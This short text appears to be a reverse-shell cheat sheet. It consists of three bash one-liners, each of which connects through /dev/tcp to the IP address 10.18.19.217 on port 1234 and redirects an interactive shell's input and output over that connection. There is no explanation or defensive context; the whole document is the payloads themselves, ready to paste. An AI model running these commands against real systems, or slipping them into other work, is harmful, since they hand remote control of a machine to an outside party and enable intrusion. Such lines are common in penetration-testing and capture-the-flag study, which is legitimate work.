bash -i >& /dev/tcp/10.18.19.217/1234 0>&1

0<&196;exec 196<>/dev/tcp/10.18.19.217/1234; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.18.19.217/1234 0<&1 2>&1
